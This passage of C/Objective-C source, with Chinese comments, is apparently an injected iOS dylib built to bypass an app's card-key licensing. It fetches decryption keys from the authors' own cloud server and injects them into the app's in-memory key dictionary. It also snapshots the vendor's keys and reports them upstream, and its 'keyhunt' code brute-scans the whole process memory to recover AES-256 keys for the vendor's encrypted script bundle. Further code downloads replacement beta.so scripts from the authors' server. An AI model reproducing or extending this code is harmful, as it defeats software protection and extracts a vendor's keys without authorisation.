    memcpy(kk, kKey, sizeof(kk));

    int ok = 0;

    // ② 内存缓存（此前取到过）→ 离线直接用
    if (g_pay_cached) {
        memcpy(vv, g_pay_vv, sizeof(vv));
        ok = 1;
    }

    // ③ 云端取载荷版本密钥
    if (!ok) {
        if (!strcmp("020909", g_pay_miss) && ++g_pay_try < VERWATCH_RETRY_EVERY) return;
        g_pay_try = 0;

        char ip[128] = {0};
        if (bs_get_host_c(ip, sizeof(ip))) {
            char url[512];
            if (g_token[0])
                snprintf(url, sizeof(url), "http://%s:%d/key?prj=%s&ver=020909&key=%s",
                         ip, g_port, BS_PRJ, g_token);
            else
                snprintf(url, sizeof(url), "http://%s:%d/key?prj=%s&ver=020909",
                         ip, g_port, BS_PRJ);

            size_t n = 0;
            unsigned char *b = bs_http_get_c(url, &n);
            if (b && n == 35 && !memcmp(b, kk, 3)) {
                memcpy(vv, b + 3, 32);
                ok = 1;
                bs_log("[mh] payload cloud key OK ver=020909");
            } else {
                bs_log("[mh] payload cloud key MISS ver=020909 n=%lu -> %s",
                       (unsigned long)n, "use builtin");
                if (strcmp(g_pay_miss, "020909")) {
                    strncpy(g_pay_miss, "020909", sizeof(g_pay_miss) - 1);
                    g_pay_miss[sizeof(g_pay_miss) - 1] = 0;
                }
            }
            if (b) free(b);
        }
    }

    // ④ 兜底：内置
    if (!ok) memcpy(vv, kVal, sizeof(vv));

    // 缓存（内置与云端都算有效值，后续离线秒补）
    memcpy(g_pay_vv, vv, sizeof(g_pay_vv));
    g_pay_cached = 1;

    @autoreleasepool {
        NSMutableDictionary *md;
        if (*slot != NULL) md = [NSMutableDictionary dictionaryWithDictionary:(NSDictionary *)(*slot)];
        else               md = [NSMutableDictionary dictionary];
        if (!md) { bs_log("[mh] payload dict build failed"); return; }
        NSData *key = [NSData dataWithBytes:kk length:sizeof(kk)];
        if ([md objectForKey:key] == nil) {
            [md setObject:[NSData dataWithBytes:vv length:sizeof(vv)] forKey:key];
            *slot = (void *)CFBridgingRetain(md);
            bs_log("[mh] payload key injected ver=%02x%02x%02x cloud=%d n=%lu",
                   kk[0], kk[1], kk[2], ok, (unsigned long)[md count]);
        }
    }
}

/// ★★★ v6.18：把任意版本键合并进字典（幂等）。须在带 autoreleasepool 的线程调用。
///   返回 1 = 字典已含该键（或本次注入成功）。
static int bs_mh_merge_key(uintptr_t base, const unsigned char kk[3], const unsigned char vv[32]) {
    void **slot = (void **)(base + OFF_MH);
    @autoreleasepool {
        if (*slot != NULL && bs_mh_has(*slot, kk)) return 1;
        NSMutableDictionary *md;
        if (*slot != NULL) md = [NSMutableDictionary dictionaryWithDictionary:(NSDictionary *)(*slot)];
        else               md = [NSMutableDictionary dictionary];
        if (!md) { bs_log("[mh] extra dict build failed"); return 0; }
        NSData *key = [NSData dataWithBytes:kk length:3];
        if ([md objectForKey:key] == nil) {
            [md setObject:[NSData dataWithBytes:vv length:32] forKey:key];
            *slot = (void *)CFBridgingRetain(md);
        }
        return 1;
    }
}

/// ★★★ v6.18：确保「头版本 + 020909 之外的段版本键」在字典里。
///   ① 字典已有 → 1（零开销） ② 云端 /key 取（35B 且首 3B 匹配才采用）→ 注入 → 1
///   ③ 失败 → 记节流（同版本连续 miss 每 VERWATCH_RETRY_EVERY 轮才重试一次）→ 0
///   bypass_throttle=1 供 so_sync 键闸门用（闸门必须拿新鲜结论，不能被节流跳过）。
///   注意：这些版本**没有内置兜底**（kKey/kVal 只覆盖 020909），取不到就是取不到。
static int bs_ensure_extra_key(uintptr_t base, const char *verhex, int bypass_throttle) {
    unsigned char kk[3];
    if (!bs_verhex_to_bytes(verhex, kk)) return 0;

    void **slot = (void **)(base + OFF_MH);
    if (base != 0 && *slot != NULL && bs_mh_has(*slot, kk)) return 1;

    // per-ver 节流（g_base==0 时无字典可查，每次都真取——闸门场景必须新鲜）
    int idx = -1;
    for (int i = 0; i < EK_VERS_MAX; i++) {
        if (g_ek_miss[i][0] == 0) { if (idx < 0) idx = i; continue; }
        if (!strcmp(g_ek_miss[i], verhex)) { idx = i; break; }
    }
    if (idx < 0) idx = 0;
    if (!bypass_throttle && !strcmp(g_ek_miss[idx], verhex) &&
        ++g_ek_try[idx] < VERWATCH_RETRY_EVERY) return 0;
    g_ek_try[idx] = 0;

    char ip[128] = {0};
    if (!bs_get_host_c(ip, sizeof(ip))) {
        bs_log("[mh] extra key %s: no host", verhex);
        return 0;
    }
    char url[512];
    if (g_token[0])
        snprintf(url, sizeof(url), "http://%s:%d/key?prj=%s&ver=%s&key=%s",
                 ip, g_port, BS_PRJ, verhex, g_token);
    else
        snprintf(url, sizeof(url), "http://%s:%d/key?prj=%s&ver=%s",
                 ip, g_port, BS_PRJ, verhex);

    size_t n = 0;
    unsigned char *b = bs_http_get_c(url, &n);
    if (b && n == 35 && !memcmp(b, kk, 3)) {
        if (base != 0 && !bs_mh_merge_key(base, kk, b + 3)) { free(b); return 0; }
        bs_log("[mh] extra key OK ver=%s (base=%s)", verhex, base != 0 ? "injected" : "cached-offline");
        g_ek_miss[idx][0] = 0; g_ek_try[idx] = 0;
        free(b);
        return 1;
    }
    bs_log("[mh] extra key MISS ver=%s n=%lu%s", verhex, (unsigned long)n,
           bypass_throttle ? " (gate)" : "");
    strncpy(g_ek_miss[idx], verhex, sizeof(g_ek_miss[idx]) - 1);
    g_ek_miss[idx][sizeof(g_ek_miss[idx]) - 1] = 0;
    if (b) free(b);
    return 0;
}

/// ★★★ v6.18：扫 beta.so 段流，收集**全部记录头版本**（去重，最多 maxv 个）。
///   游走规则与 beta_so_parse.py 逐条对齐：
///     type=0  头 44B：usz@36 csz@40，next = +44+csz（不对齐）
///     type=2  头 42B：nl@36 cl@40，  next = +42+align16(nl+cl)
///     type=1  头 46B：nl@36 cl@40 ci@42，next = +46+align16(ci)
///   任何异常（未知类型 / 尺寸越界 / 回绕）即停 —— 返回已扫到的版本数。
///   纯内存只读头 46B 窗口，不解密，1.2MB 文件微秒级。
static int bs_scan_so_vers(const unsigned char *b, size_t n,
                           unsigned char out[][3], int maxv) {
    int cnt = 0;
    size_t off = 0;
    while (off + 46 <= n && cnt < maxv) {
        unsigned char t = b[off];
        int known = 0;
        for (int i = 0; i < cnt; i++)
            if (!memcmp(out[i], b + off + 1, 3)) { known = 1; break; }
        if (!known) { memcpy(out[cnt], b + off + 1, 3); cnt++; }

        unsigned nl = (unsigned)b[off + 36] | ((unsigned)b[off + 37] << 8);
        unsigned cl = (unsigned)b[off + 38] | ((unsigned)b[off + 39] << 8) |
                      ((unsigned)b[off + 40] << 16) | ((unsigned)b[off + 41] << 24);
        size_t next = 0;
        if (t == 0) {
            unsigned csz = (unsigned)b[off + 40] | ((unsigned)b[off + 41] << 8) |
                           ((unsigned)b[off + 42] << 16) | ((unsigned)b[off + 43] << 24);
            next = off + 44 + csz;
        } else if (t == 2) {
            if (nl >= 4096 || cl == 0 || cl > 30000000u) break;
            next = off + 42 + (((size_t)nl + cl + 15) / 16 * 16);
        } else if (t == 1) {
            unsigned ci = (unsigned)b[off + 42] | ((unsigned)b[off + 43] << 8) |
                          ((unsigned)b[off + 44] << 16) | ((unsigned)b[off + 45] << 24);
            if (nl >= 4096 || cl == 0 || cl > 30000000u || ci == 0 || ci > 30000000u) break;
            next = off + 46 + (((size_t)ci + 15) / 16 * 16);
        } else {
            break;
        }
        if (next <= off || next > n) break;
        off = next;
    }
    return cnt;
}

/// ★ v6.18：verwatch 用的「盘上 beta.so 版本集合」刷新器。
///   (size, mtime) 都没变 → 沿用上次扫描结果（0 开销）；变了 → 重读重扫。
///   返回当前集合里的版本个数（失败/文件不存在 → 0）。
static int bs_read_file(const char *path, unsigned char **out, size_t *outlen);   // 定义在 probe 段（v6.4）
static int bs_refresh_so_vers(void) {
    struct stat st;
    if (stat(DATA_DIR "/beta.so", &st) != 0) { g_ek_nver = 0; return 0; }
    long long mt = (long long)st.st_mtimespec.tv_sec;
    if ((off_t)st.st_size == g_ek_scan_size && mt == g_ek_scan_mtime && g_ek_scan_size >= 0)
        return g_ek_nver;                       // 文件没变：沿用缓存
    g_ek_scan_size = (off_t)st.st_size;
    g_ek_scan_mtime = mt;
    g_ek_nver = 0;
    if (st.st_size < 46 || st.st_size > SO_MAX_BYTES) return 0;
    unsigned char *buf = NULL;
    size_t bn = 0;
    if (!bs_read_file(DATA_DIR "/beta.so", &buf, &bn)) return 0;
    int nv = bs_scan_so_vers(buf, bn, g_ek_vers, EK_VERS_MAX);
    free(buf);
    g_ek_nver = nv;
    if (nv > 0) {
        char lst[16 * 8] = {0};
        for (int i = 0; i < nv; i++) {
            char one[10];
            snprintf(one, sizeof(one), "%s%02x%02x%02x", i ? "," : "",
                     g_ek_vers[i][0], g_ek_vers[i][1], g_ek_vers[i][2]);
            strncat(lst, one, sizeof(lst) - strlen(lst) - 1);
        }
        bs_log("[mh] scan beta.so (%ld B) -> %d ver(s): %s",
               (long)bn, nv, lst);
    }
    return nv;
}

/// ★ v6.5：版本哨兵 —— 每 3s 纯 C 读 beta.so 头 4B（微秒级开销）。
///   官方把新包落盘后，这里 3s 内就发现 → /key 取新版本密钥 → 合并注入，
///   **早于** Agent 约 12s 后的脚本重载 ⇒ 免卡密机跟版不再需要重开 App。
static void *bs_verwatch(void *arg) {
    uintptr_t base = (uintptr_t)arg;
    bs_log("[ver] verwatch start (tick=%ds)", VERWATCH_TICK_SECS);
    for (;;) {
        sleep(VERWATCH_TICK_SECS);
        @autoreleasepool {
            bs_inject_mh(base);
            bs_ensure_payload_key(base);   // ★ v6.15：载荷记录版本（020909）也必须常驻
            // ★ v6.18：多版本键常驻 —— 盘上 beta.so 每个段版本都要有键。
            //   3.0.5 实锤：lua 记录带 030002~030005 各版本，缺任何一把都会
            //   `can not find version key!!` → load snail module failed。
            int nv = bs_refresh_so_vers();
            for (int i = 0; i < nv; i++) {
                char vh[8];
                snprintf(vh, sizeof(vh), "%02x%02x%02x",
                         g_ek_vers[i][0], g_ek_vers[i][1], g_ek_vers[i][2]);
                bs_ensure_extra_key(base, vh, 0);
            }
        }
    }
    return NULL;
}

// ================================================================
// ★★★ v6.4：probe 模式（真卡机只读雷达）
//
//   与 unlock 模式共用一个二进制，靠 bs_pull.conf 的 `mode=probe` 切换。
//   probe 只读不写：读版本 → 读密钥字典 → POST 上报；绝不注入 / 心跳 / 拉模块。
// ================================================================

/// 读整个文件到 malloc 缓冲（调用方 free）。成功返回 1，失败返回 0。
static int bs_read_file(const char *path, unsigned char **out, size_t *outlen) {
    *out = NULL;
    *outlen = 0;
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;
    struct stat st;
    if (fstat(fd, &st) != 0 || st.st_size <= 0) { close(fd); return 0; }
    size_t n = (size_t)st.st_size;
    unsigned char *b = (unsigned char *)malloc(n);
    if (!b) { close(fd); return 0; }
    size_t off = 0;
    while (off < n) {
        ssize_t r = read(fd, b + off, n - off);
        if (r <= 0) break;
        off += (size_t)r;
    }
    close(fd);
    if (off != n) { free(b); return 0; }
    *out = b;
    *outlen = n;
    return 1;
}

/// 6 位 hex -> 3 字节（probe 内部用，不依赖 sscanf）
static void bs_hex3(const char *h, unsigned char *o) {
    for (int i = 0; i < 3; i++) {
        char a = h[i * 2], b = h[i * 2 + 1];
        int hi = (a <= '9') ? (a - '0') : ((a | 0x20) - 'a' + 10);
        int lo = (b <= '9') ? (b - '0') : ((b | 0x20) - 'a' + 10);
        o[i] = (unsigned char)(((hi & 0xf) << 4) | (lo & 0xf));
    }
}

/// 把 _g_script_mushroom_head 字典快照成纯 C 数组（[3B ver][32B val] × N）。
///   ★ 只在这里碰 ObjC 字典（调用点带 @autoreleasepool），后续线程只读纯 C 副本，
///     避免在裸 pthread 上反复走 objc runtime。
///   ★ 允许反复调用：App 可能在启动若干秒后才从卡密服务器拿到密钥。
static void bs_mh_snapshot(uintptr_t base) {
    g_mh_n = 0;
    int ok = 0;
    @autoreleasepool {
        id raw = *(id *)(base + OFF_MH);
        if (raw && [raw isKindOfClass:[NSDictionary class]]) {
            NSDictionary *d = (NSDictionary *)raw;
            [d enumerateKeysAndObjectsUsingBlock:^(id k, id v, BOOL *stop) {
                if (![k isKindOfClass:[NSData class]]) return;
                if (![v isKindOfClass:[NSData class]]) return;
                NSData *kd = (NSData *)k;
                NSData *vd = (NSData *)v;
                if (kd.length != 3 || vd.length != 32) return;
                if (g_mh_n >= MH_SNAP_MAX) return;
                memcpy(g_mh_snap[g_mh_n], kd.bytes, 3);
                memcpy(g_mh_snap[g_mh_n] + 3, vd.bytes, 32);
                g_mh_n++;
            }];
            ok = 1;
        }
    }
    if (g_mh_n > 0) {
        char line[160];
        int p = snprintf(line, sizeof(line), "[probe] mh snapshot n=%d:", g_mh_n);
        for (int i = 0; i < g_mh_n && p < (int)sizeof(line) - 12; i++)
            p += snprintf(line + p, sizeof(line) - p, " %02x%02x%02x",
                          g_mh_snap[i][0], g_mh_snap[i][1], g_mh_snap[i][2]);
        bs_log("%s", line);
    } else {
        bs_log("[probe] mh snapshot empty (dict=%s)", ok ? "present" : "nil");
    }
}

// ================================================================
// ★★★ v6.23q：keyhunt —— 密钥字典缺失时的进程内存暴力找回
//
//   背景：厂商 3.0.9 起改了密钥送达方式，解密密钥不再进
//   _g_script_mushroom_head 字典 → probe 每拍 "not in dict yet"，
//   云端永远等不到 030009（.71 实测：脚本在跑 3.0.9、字典仍 n=8）。
//   但密钥在脚本解密那一刻必经本进程内存。做法：
//     1) 读盘上 beta.so，解析段链，取【ver==目标版本】的 type=1 段
//        （★ 段链混版本：030008 包里 400 段是 020909 的，必须按段头 ver 过滤）
//     2) 遍历本进程可读内存（mach_vm_region + mach_vm_read_overwrite，
//        4MB 分块），把每个候选 32B 窗口当 AES-256-ECB 密钥试解：
//          粗筛：首块解密 == 合法 zlib 头（0x78 且 (CMF<<8|FLG)%31==0）
//          精验：整段解密 + libcompression 原始 deflate == nl+cl 且 name 可打印
//     3) 命中 → 注入 g_mh_snap，让常规 BSPR 上报链路照跑 → 云端入库
//   AES 纯 C 实现（表全部运行期生成，无魔法常量），先过 FIPS-197 自检，
//   自检失败或 libcompression 不可用则 keyhunt 自动禁用（不影响 probe 其余功能）。
// ================================================================

#define KH_RK_WORDS 60                    // AES-256 轮密钥字数 (Nk=8, Nr=14)

static unsigned char kh_sbox[256], kh_isbox[256];
static unsigned char kh_m9[256], kh_mb[256], kh_md[256], kh_me[256];
static int kh_ready = 0;
static unsigned char kh_chunk[1 << 22];   // 4MB 扫描缓冲（静态区，不占栈）

static unsigned char kh_xt(unsigned char a) {
    return (unsigned char)((a << 1) ^ ((a & 0x80) ? 0x1b : 0));
}
static unsigned char kh_gmul(unsigned char a, unsigned char b) {
    unsigned char p = 0;
    while (b) { if (b & 1) p ^= a; a = kh_xt(a); b >>= 1; }
    return p;
}
/// 运行期生成 S 盒（乘逆+仿射）与 InvMixColumns 乘法表，零魔法常量。
static void kh_init(void) {
    if (kh_ready) return;
    for (int i = 0; i < 256; i++) {
        unsigned char inv = 0;
        if (i) {
            for (int j = 1; j < 256; j++)
                if (kh_gmul((unsigned char)i, (unsigned char)j) == 1) { inv = (unsigned char)j; break; }
        }
        unsigned char x = inv, s = inv;
        for (int k = 0; k < 4; k++) { x = (unsigned char)((x << 1) | (x >> 7)); s ^= x; }
        kh_sbox[i] = (unsigned char)(s ^ 0x63);
    }
    for (int i = 0; i < 256; i++) kh_isbox[kh_sbox[i]] = (unsigned char)i;
    for (int i = 0; i < 256; i++) {
        kh_m9[i] = kh_gmul((unsigned char)i, 0x09);
        kh_mb[i] = kh_gmul((unsigned char)i, 0x0b);
        kh_md[i] = kh_gmul((unsigned char)i, 0x0d);
        kh_me[i] = kh_gmul((unsigned char)i, 0x0e);
    }
    kh_ready = 1;
}

static void kh_expand(const unsigned char *key, unsigned int rk[KH_RK_WORDS]) {
    static const unsigned int rcon[7] = { 0x01000000u, 0x02000000u, 0x04000000u,
        0x08000000u, 0x10000000u, 0x20000000u, 0x40000000u };
    for (int i = 0; i < 8; i++)
        rk[i] = ((unsigned)key[4*i] << 24) | ((unsigned)key[4*i+1] << 16) |
                ((unsigned)key[4*i+2] << 8) | (unsigned)key[4*i+3];
    for (int i = 8; i < KH_RK_WORDS; i++) {
        unsigned t = rk[i-1];
        if (i % 8 == 0) {
            t = (t << 8) | (t >> 24);                    // RotWord
            t = ((unsigned)kh_sbox[(t >> 24) & 0xff] << 24) |
                ((unsigned)kh_sbox[(t >> 16) & 0xff] << 16) |
                ((unsigned)kh_sbox[(t >> 8) & 0xff] << 8) |
                (unsigned)kh_sbox[t & 0xff];             // SubWord
            t ^= rcon[i/8 - 1];
        } else if (i % 8 == 4) {
            t = ((unsigned)kh_sbox[(t >> 24) & 0xff] << 24) |
                ((unsigned)kh_sbox[(t >> 16) & 0xff] << 16) |
                ((unsigned)kh_sbox[(t >> 8) & 0xff] << 8) |
                (unsigned)kh_sbox[t & 0xff];
        }
        rk[i] = rk[i-8] ^ t;
    }
}

/// 直列逆密码（FIPS-197 InvCipher）：初始 AddRoundKey(Nr)，末轮无 InvMixColumns。
static void kh_dec_block(const unsigned int rk[KH_RK_WORDS],
                         const unsigned char in[16], unsigned char out[16]) {
    unsigned char s[16], t[16];
    for (int c = 0; c < 4; c++) {
        unsigned w = rk[56 + c];
        s[4*c+0] = in[4*c+0] ^ (unsigned char)(w >> 24);
        s[4*c+1] = in[4*c+1] ^ (unsigned char)(w >> 16);
        s[4*c+2] = in[4*c+2] ^ (unsigned char)(w >> 8);
        s[4*c+3] = in[4*c+3] ^ (unsigned char)w;
    }
    for (int r = 13; r >= 1; r--) {
        for (int c = 0; c < 4; c++)                       // InvShiftRows + InvSubBytes
            for (int j = 0; j < 4; j++)
                t[4*c+j] = kh_isbox[ s[4*((c + 4 - j) & 3) + j] ];
        for (int c = 0; c < 4; c++) {                     // AddRoundKey(r)
            unsigned w = rk[r*4 + c];
            t[4*c+0] ^= (unsigned char)(w >> 24);
            t[4*c+1] ^= (unsigned char)(w >> 16);
            t[4*c+2] ^= (unsigned char)(w >> 8);
            t[4*c+3] ^= (unsigned char)w;
        }
        for (int c = 0; c < 4; c++) {                     // InvMixColumns
            unsigned char a0 = t[4*c], a1 = t[4*c+1], a2 = t[4*c+2], a3 = t[4*c+3];
            s[4*c+0] = (unsigned char)(kh_me[a0] ^ kh_mb[a1] ^ kh_md[a2] ^ kh_m9[a3]);
            s[4*c+1] = (unsigned char)(kh_m9[a0] ^ kh_me[a1] ^ kh_mb[a2] ^ kh_md[a3]);
            s[4*c+2] = (unsigned char)(kh_md[a0] ^ kh_m9[a1] ^ kh_me[a2] ^ kh_mb[a3]);
            s[4*c+3] = (unsigned char)(kh_mb[a0] ^ kh_md[a1] ^ kh_m9[a2] ^ kh_me[a3]);
        }
    }
    for (int c = 0; c < 4; c++)                           // 末轮：InvShiftRows + InvSubBytes
        for (int j = 0; j < 4; j++)
            t[4*c+j] = kh_isbox[ s[4*((c + 4 - j) & 3) + j] ];
    for (int c = 0; c < 4; c++) {                         // AddRoundKey(0)
        unsigned w = rk[c];
        out[4*c+0] = (unsigned char)(t[4*c+0] ^ (unsigned char)(w >> 24));
        out[4*c+1] = (unsigned char)(t[4*c+1] ^ (unsigned char)(w >> 16));
        out[4*c+2] = (unsigned char)(t[4*c+2] ^ (unsigned char)(w >> 8));
        out[4*c+3] = (unsigned char)(t[4*c+3] ^ (unsigned char)w);
    }
}

/// FIPS-197 C.3 已知答自检（AES-256）。失败返回 0（keyhunt 禁用）。
static int kh_selftest(void) {
    static const unsigned char k[32] = {
        0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f,
        0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x1a,0x1b,0x1c,0x1d,0x1e,0x1f };
    static const unsigned char ctv[16] = {
        0x8e,0xa2,0xb7,0xca,0x51,0x67,0x45,0xbf,0xea,0xfc,0x49,0x90,0x4b,0x49,0x60,0x89 };
    static const unsigned char ptv[16] = {
        0x00,0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x99,0xaa,0xbb,0xcc,0xdd,0xee,0xff };
    unsigned int rk[KH_RK_WORDS];
    unsigned char out[16];
    kh_expand(k, rk);
    kh_dec_block(rk, ctv, out);
    return memcmp(out, ptv, 16) == 0;
}

/// libcompression 的 compression_decode_buffer 运行期解析（避免改 CI 链接参数）。
typedef size_t (*kh_cdec_t)(unsigned char *, size_t,
                            const unsigned char *, size_t, void *, unsigned int);
static kh_cdec_t kh_cdec = NULL;
static int kh_cdec_tried = 0;
static void kh_load_cdec(void) {
    if (kh_cdec_tried) return;
    kh_cdec_tried = 1;
    void *h = dlopen("/usr/lib/libcompression.dylib", RTLD_LAZY);
    if (!h) h = dlopen("libcompression.dylib", RTLD_LAZY);
    if (!h) h = dlopen("/System/Library/Frameworks/Compression.framework/Compression", RTLD_LAZY);
    if (h) kh_cdec = (kh_cdec_t)dlsym(h, "compression_decode_buffer");
}

/// 段链解析：找【ver==目标】的第一个 type=1 段（★ 混版本包必须按段头 ver 过滤）。
static int kh_pick_ct(const unsigned char *b, size_t n, const unsigned char *ver3,
                      const unsigned char **ct, unsigned int *ci_out,
                      unsigned int *nl_out, unsigned int *cl_out) {
    size_t off = 0;
    while (off + 46 <= n) {
        unsigned char t = b[off];
        unsigned int nl, cl, ci;
        if (t == 0) {                                     // 元数据段: [usz u32][csz u32][raw zlib]
            unsigned int usz, csz;
            memcpy(&usz, b + off + 36, 4);
            memcpy(&csz, b + off + 40, 4);
            if (csz == 0 || csz > 30000000u) return 0;
            off += 44 + csz;
            continue;
        }
        memcpy(&nl, b + off + 36, 2);                     // u16 LE
        memcpy(&cl, b + off + 38, 4);                     // u32 LE
        memcpy(&ci, b + off + 42, 4);                     // u32 LE
        if (t == 2) {                                     // PNG 段: 头 42B
            if (nl < 4096 && cl > 0 && cl < 30000000u) {
                off += 42 + ((nl + cl + 15) / 16) * 16;
                continue;
            }
            return 0;
        }
        if (t == 1 && nl < 4096 && cl > 0 && cl < 30000000u && ci > 0 && ci <= 30000000u) {
            if (memcmp(b + off + 1, ver3, 3) == 0) {
                *ct = b + off + 46;
                *ci_out = ci; *nl_out = nl; *cl_out = cl;
                return 1;
            }
            off += 46 + ((ci + 15) / 16) * 16;
            continue;
        }
        return 0;                                         // 链坏 -> 放弃
    }
    return 0;
}

/// 候选密钥验证。粗筛（首块 zlib 头）永远做；精验（整段解密+解压+name 可打印）
/// 只在粗筛通过时做。命中返回 1 并把 32B 密钥拷进 outkey。
static int kh_test_key(const unsigned char *key, const unsigned char *seg,
                       unsigned int ci, unsigned int nl, unsigned int cl,
                       unsigned char *outkey) {
    unsigned int rk[KH_RK_WORDS];
    unsigned char b0[16];
    kh_expand(key, rk);
    kh_dec_block(rk, seg, b0);
    if (b0[0] != 0x78) return 0;                          // zlib CMF
    if ((((unsigned)b0[0] << 8) | b0[1]) % 31 != 0) return 0;   // FCHECK
    if (!kh_cdec) return 0;
    unsigned int pad = (ci + 15) / 16 * 16;
    unsigned char *full = (unsigned char *)malloc(pad);
    if (!full) return 0;
    for (unsigned int o = 0; o < pad; o += 16)
        kh_dec_block(rk, seg + o, full + o);
    unsigned char *dst = (unsigned char *)malloc((size_t)nl + cl);
    int okv = 0;
    if (dst) {
        size_t got = kh_cdec(dst, (size_t)nl + cl, full + 2, pad - 2, NULL,
                             0x200 /* COMPRESSION_ZLIB（原始 deflate）*/);
        if (got == (size_t)nl + cl) {
            int printable = 1;                            // 段名必须可打印（伪命中兜底）
            for (unsigned int i = 0; i < nl; i++)
                if (dst[i] < 0x20 || dst[i] > 0x7e) { printable = 0; break; }
            if (printable) { memcpy(outkey, key, 32); okv = 1; }
        }
        free(dst);
    }
    free(full);
    return okv;
}

/// 单块缓冲扫描：pass1 = 64 连 hex 文本串；pass2 = 4 字节对齐原始 32B 窗口。
static int kh_scan_buf(const unsigned char *buf, size_t n,
                       const unsigned char *seg, unsigned int ci,
                       unsigned int nl, unsigned int cl,
                       unsigned char *outkey, unsigned long long *tried) {
    size_t i = 0;                                         // pass1: hex 文本
    while (i + 64 <= n) {
        if (isxdigit((int)buf[i])) {
            size_t j = i;
            while (j < n && isxdigit((int)buf[j])) j++;
            if (j - i >= 64) {
                for (size_t s0 = i; s0 + 64 <= j; s0++) {
                    unsigned char k[32];
                    int bad = 0;
                    for (int q = 0; q < 32; q++) {
                        unsigned char a = buf[s0 + 2*q], b2 = buf[s0 + 2*q + 1];
                        int hi = (a <= '9') ? (a - '0') : ((a | 0x20) - 'a' + 10);
                        int lo = (b2 <= '9') ? (b2 - '0') : ((b2 | 0x20) - 'a' + 10);
                        if (hi > 15 || lo > 15) { bad = 1; break; }
                        k[q] = (unsigned char)((hi << 4) | lo);
                    }
                    (*tried)++;
                    if (!bad && kh_test_key(k, seg, ci, nl, cl, outkey)) return 1;
                }
            }
            i = j;
        } else i++;
    }
    for (size_t off = 0; off + 32 <= n; off += 4) {       // pass2: 原始窗口
        (*tried)++;
        if (kh_test_key(buf + off, seg, ci, nl, cl, outkey)) return 1;
    }
    return 0;
}

/// keyhunt 主入口：返回 1 = 找到（outkey 32B），0 = 没找到/功能不可用。
static int kh_keyhunt(const unsigned char *ver3, unsigned char *outkey) {
    kh_init();
    if (!kh_selftest()) {
        bs_log("[keyhunt] AES selftest FAIL -> keyhunt disabled");
        return 0;
    }
    kh_load_cdec();
    if (!kh_cdec) {
        bs_log("[keyhunt] libcompression unavailable -> keyhunt disabled");
        return 0;
    }
    unsigned char *so = NULL;
    size_t solen = 0;
    if (!bs_read_file(DATA_DIR "/beta.so", &so, &solen)) {
        bs_log("[keyhunt] read beta.so failed errno=%d", errno);
        return 0;
    }
    const unsigned char *seg = NULL;
    unsigned int ci = 0, nl = 0, cl = 0;
    int have = kh_pick_ct(so, solen, ver3, &seg, &ci, &nl, &cl);
    if (!have) {
        free(so);
        bs_log("[keyhunt] beta.so has no type=1 seg ver=%02x%02x%02x",
               ver3[0], ver3[1], ver3[2]);
        return 0;
    }
    mach_port_t task = mach_task_self();
    mach_vm_address_t addr = 0x1000;
    unsigned long long tried = 0;
    int found = 0;
    while (!found) {
        mach_vm_size_t rsize = 0;
        vm_region_basic_info_data_64_t info;
        mach_msg_type_number_t icnt = VM_REGION_BASIC_INFO_COUNT_64;
        mach_port_t obj = MACH_PORT_NULL;
        kern_return_t kr = mach_vm_region(task, &addr, &rsize, VM_REGION_BASIC_INFO_64,
                                          (vm_region_info_t)&info, &icnt, &obj);
        if (kr != KERN_SUCCESS) break;
        if (obj != MACH_PORT_NULL) mach_port_deallocate(task, obj);
        if (info.protection & VM_PROT_READ) {
            mach_vm_address_t p = addr;
            mach_vm_size_t left = rsize;
            while (!found && left > 0) {
                mach_vm_size_t want = left > sizeof(kh_chunk) ? sizeof(kh_chunk) : left;
                mach_vm_size_t got = 0;
                kr = mach_vm_read_overwrite(task, p, want,
                        (mach_vm_address_t)(uintptr_t)kh_chunk, &got);
                if (kr != KERN_SUCCESS || got == 0) break;
                found = kh_scan_buf(kh_chunk, (size_t)got, seg, ci, nl, cl,
                                    outkey, &tried);
                p += got;
                left -= got;
            }
        }
        addr += rsize;
        if (addr < 0x1000) break;                         // 地址回绕防呆
    }
    free(so);
    bs_log("[keyhunt] scan done tried=%llu found=%d", tried, found);
    return found;
}

// ================================================================
// ★★★ v6.6：主动跟版（解锁模式专用）
//
//   目的：假卡机不依赖官方 server2 通道，也能从**我们自己的云端**取到新 beta.so。
//   链路：GET /ver?prj=sjz  →（云端版本 > 本地 && 云端有该版本密钥）→
//         GET /script/beta.so?ver=<新版本> → 校验 → 原子落盘。
//   落盘后由 bs_verwatch（3s）自动补该版本密钥（v6.5）。
//   ⚠️ 脚本不热加载：包到位 ≠ 立即在跑，仍需一次重开 App。
// ================================================================

/// 原子写文件：同目录 .sync.tmp → 写满 → fsync → rename 覆盖。
///   ★ 绝不用 O_TRUNC 直接写目标文件：那样在写入途中崩溃/被杀会留下半个 beta.so，
///     脚本加载器读到残包可能直接崩。rename 是原子的，最差是保留旧文件。
static int bs_write_file_atomic(const char *path, const unsigned char *buf, size_t len) {
    char tmp[512];
    snprintf(tmp, sizeof(tmp), "%s.sync.tmp", path);
    int fd = open(tmp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) {
        bs_log("[so] open tmp failed errno=%d", errno);
        return 0;
    }
    size_t off = 0;
    while (off < len) {
        ssize_t w = write(fd, buf + off, len - off);
        if (w <= 0) break;
        off += (size_t)w;
    }
    if (off == len) fsync(fd);
    close(fd);
    if (off != len) {
        bs_log("[so] write short %lu/%lu errno=%d", (unsigned long)off,
               (unsigned long)len, errno);
        unlink(tmp);
        return 0;
    }
    if (rename(tmp, path) != 0) {
        bs_log("[so] rename failed errno=%d", errno);
        unlink(tmp);
        return 0;
    }
    return 1;
}

/// 从服务端 JSON 里抠出 "ver" 的 6 位小写 hex 值（纯 C，不碰 NSJSONSerialization）。
///   ★ 必须精确匹配键名 "ver"（键后紧跟引号）——否则会误抓 "ver_dot": "3.0.0"。
///   ★ 服务端 json.dumps 默认带空格，所以冒号两侧空白都要容忍。
static int bs_json_pick_ver(const unsigned char *j, size_t n, char *out, size_t outsz) {
    if (!out || outsz < 7) return 0;
    for (size_t i = 0; i + 5 < n; i++) {
        if (j[i] != '"') continue;
        if (memcmp(j + i + 1, "ver", 3) != 0) continue;
        if (j[i + 4] != '"') continue;               // 排除 "ver_dot" / "verbose"
        size_t k = i + 5;
        while (k < n && (j[k] == ' ' || j[k] == '\t')) k++;
        if (k >= n || j[k] != ':') continue;
        k++;
